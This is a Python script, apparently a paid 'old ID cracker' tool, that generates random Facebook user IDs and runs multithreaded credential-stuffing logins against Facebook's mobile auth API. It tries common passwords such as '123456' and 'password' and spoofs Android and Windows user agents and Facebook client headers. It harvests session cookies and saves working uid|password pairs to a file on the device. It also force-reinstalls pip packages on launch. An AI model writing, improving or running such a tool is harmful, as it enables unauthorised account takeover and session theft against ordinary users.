import os, sys, uuid, re, random, time, string, json, base64

try:

    os.system(
        'pip uninstall requests chardet urllib3 idna certifi rich -y;pip install chardet urllib3 idna certifi requests rich')
    import requests, rich, certifi, pycurl
except:
    os.system("git pull")

    os.system("pip3 install requests rich certifi pycurl")

    import requests, rich, certifi, pycurl

from rich import print
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor as ThreadPool

from io import BytesIO
import os
import random
import string
import sys
import threading
import time
import uuid
import rich
from datetime import datetime
from rich import print
import requests
import certifi
from concurrent.futures import ThreadPoolExecutor as ThreadPool

version = "  v1"


def Samsung():
    Anderson = random.choice(["10", "13", "7.0.0", "7.1.1", "9", "12", "11", "9.0", "8.0.0", "7.1.2", "7.0", "4", "5",
                              "4.4.2", "5.1.1", "6.0.1", "9.0.1"])
    model = random.choice(["GT-I9505", "SM-T835", "SM-S901U", "MMB29K", "SM-S134DL", "SM-J250F", "SM-A217F",
                           "SM-A326B", "SM-A125F", "SM-A720F", "SM-A326U", "SM-G532M", "SM-J410G", "SM-A205GN",
                           "SM-A205GN", "SM-A505GN", "SM-G930F", "SM-J210F", "SM-N9005", "SM-J210F"])
    vir = str(random.choice(range(111111111, 999999999)))
    cho = str(random.choice(range(43, 447)))
    fb = random.choice(["com.facebook.adsmanager|MobileAdsManagerAndroid", "com.facebook.katana|FB4A",
                        "com.facebook.orca|Orca-Android", "com.facebook.mlite|MessengerLite"])
    FBAN = fb.split("|")[1]
    platform = fb.split("|")[0]
    ua = f"Dalvik/2.1.0 (Linux; U; Android {Anderson}; {model} Build/LRX22C) [FBAN/{FBAN};FBAV/{cho}.0.0.15.89;FBPN/{platform};FBLC/sv_SE;FBBV/{vir};FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/{model};FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{{density={random.choice(range(1, 4))}.0,width={random.choice(range(720, 1500))},height={random.choice(range(1500, 2000))};FB_FW/1;]"
    return ua


def uaxxxx():
    rr = random.randint
    aZ = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    rx = random.randrange(1, 999)
    xx = f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9, 11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99, 149))}.0.{str(rr(4500, 4999))}.{str(rr(35, 99))} Chrome/{str(rr(99, 175))}.0.{str(rr(0, 5))}.{str(rr(0, 5))} Safari/537.36"
    return xx


class sort:

    def line():
        return "[b dark_sea_green2]━" * 37

    def clear():
        os.system("clear")

    def logo():
        aci = f'''        //   ) )                                      
       //___/ /  __     ( )   __      ___      ___    
      / ____ / //  ) ) / / //   ) ) //   ) ) //___) ) 
     //       //      / / //   / / //       //        
    //       //      / / //   / / ((____   ((____{version}\n{sort.line()}\n     [red1]✗ [chartreuse1]Developer [orange3]▶  [chartreuse1]PRINCE\n     [red1]✗ [light_green]Status    [orange3]▶  [medium_purple1][r]PAID[/r]\n{sort.line()}'''
        print(aci)

    def color():
        co = ['\x1b[1;93m', '\x1b[1;91m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m']
        cx = random.choice(co)
        return cx


oks = []
loop = []


def old():
    user = []
    sort.clear()
    sort.logo()
    print("[b]    [red1][A] [sea_green2]Crack 10001-10009 Id")
    print("[b]    [red1][B] [spring_green1]Crack 61550 Id")
    print(sort.line())
    ask = input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m ")

    if ask in ["1", "01", "a", "A"]:
        print(" [b]    [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]Uid 10001-10009")
        print(sort.line())
        print("[b]     [red1]✗ [chartreuse1]Example   [orange3]▶  [chartreuse1]100000, 200000")
        limit = int(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
        print(sort.line())
        star = "1000"
        for i in range(limit):
            data = str(random.choice(range(50000000000, 99999999999)))
            user.append(data)
    else:
        star = "615509"
        print(" [b]    [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]Uid 61550")
        print(sort.line())
        print("  [b]   [red1]✗ [chartreuse1]Example   [orange3]▶  [chartreuse1]100000, 200000")
        limit = int(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
        print(sort.line())

        for i in range(limit):
            data = str(random.choice(range(10000000, 99999999)))
            user.append(data)
    print("[b]    [red1][1] [sea_green2]Method A")
    print("[b]    [red1][2] [spring_green1]Method B")
    print(sort.line())
    meth = input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m ")

    with ThreadPool(max_workers=50) as heron:
        sort.clear()
        sort.logo()
        print(" [b]    [red1]✗ [chartreuse1]Total Uid [orange3]▶  [chartreuse1]" + str(len(user)))
        print(" [b]    [red1]✗ [light_green]Login Ids [orange3]▶  [light_green]Just Now")
        print(sort.line())
        for mal in user:
            uid = star + mal
            heron.submit(login, uid, meth)


def login(uid, meth):
    global oks, loop
    Session = requests.session()
    try:
        sys.stdout.write(
            f"\r  \x1b[38;1;196m  \x1b[38;0;196m└\033[38;5;46m[{sort.color()}PYC-XD\033[38;5;46m]~[\x1b[1;97m{loop}-M{meth}\033[38;5;46m]-[\x1b[1;90mOK:{str(len(oks))}\033[38;5;46m] \r")
        sys.stdout.flush()
        for pw in ["123456", "1234567", "12345678", "123456789", "password", "654321", "@#@#@#"]:
            if meth in ["1", "01", "A", "a"]:
                agent = uaxxxx()
            else:
                agent = Samsung()
            headers = {
                "x-fb-connection-bandwidth": str(random.randint(200000000, 300000000)),
                "x-fb-sim-hni": str(random.randint(20000, 40000)),
                "x-fb-net-hni": str(random.randint(20000, 40000)),
                "x-fb-connection-quality": "EXCELLENT",
                "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
                "user-agent": agent,
                "content-type": "application/x-www-form-urlencoded",
                "x-fb-http-engine": "Liger"}
            rp = Session.get(
                "https://b-api.facebook.com/method/auth.login?format=json&email=" + str(uid) + "&password=" + str(
                    pw) + "&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type"
                          "=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0"
                          "&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos"
                          ".headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728"
                          "|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true",
                headers=headers).json()
            if "session_key" in rp:
                oks.append(uid)
                coki = ";".join(i["name"] + "=" + i["value"] for i in rp["session_cookies"])
                print(
                    f"\r\r[b]    [bright_white]┝[red1]➤[spring_green1][[deep_pink2]OK[spring_green1]] [green_yellow]{uid} [red3]• [spring_green1]{pw}\n {coki}")
                open("/sdcard/pyc_old.txt", "a").write(uid + "|" + pw + "\n")
                break
            elif "Please Confirm Email" in str(rp):
                oks.append(uid)
                print(
                    f"\r\r[b]    [bright_white]┝[red1]➤[spring_green1][[deep_pink2]OK[spring_green1]] [green_yellow]{uid} [red3]• [spring_green1]{pw}")
                open("/sdcard/pyc_old.txt", "a").write(uid + "|" + pw + "\n")
                break

            else:
                continue
        loop += 1
    except:
        time.sleep(30)


old()
